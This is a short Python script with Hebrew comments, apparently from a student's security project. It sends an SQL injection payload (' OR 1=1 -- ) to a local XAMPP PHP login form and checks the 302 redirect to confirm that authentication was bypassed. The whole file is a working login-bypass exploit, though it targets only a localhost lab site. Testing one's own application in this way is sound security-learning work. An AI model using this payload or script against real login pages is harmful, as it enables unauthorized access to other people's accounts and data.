import requests

# כתובת האתר שלך (שנה לכתובת שבה האתר רץ אצלך ב-XAMPP)
target_url = "http://localhost/CyberProject/login.php"

# ה-Payload שגילינו שעוקף את האימות
# שמנו לב שצריך רווח אחרי המקפים ב-SQLite
payload_username = "' OR 1=1 -- "
payload_password = "anything_works"

# הנתונים שנשלח בטופס (השמות username ו-password חייבים להתאים ל-name ב-HTML)
data = {
    "username": payload_username,
    "password": payload_password,
    "login_submit": "" # שליחת הכפתור כדי שה-PHP יזהה את הבקשה
}

print(f"[*] Attempting SQL Injection on {target_url}...")

try:
    # שליחת הבקשה (אנחנו מבקשים לא לעקוב אחרי הפניות אוטומטית כדי שנראה את ה-302)
    response = requests.post(target_url, data=data, allow_redirects=False)

    # ב-PHP שלך, אם הלוגין מצליח, יש header("Location: home.php") - זה קוד 302
    if response.status_code == 302 and "home.php" in response.headers.get("Location", ""):
        print("[+] SUCCESS: SQL Injection Bypass Worked!")
        print(f"[+] Logged in as the first user in the database.")
    elif "Invalid username or password" in response.text:
        print("[-] FAILED: Injection was blocked or incorrect.")
    else:
        print("[?] UNKNOWN: Received unexpected response. Check manually.")

except Exception as e:
    print(f"[!] Error: {e}")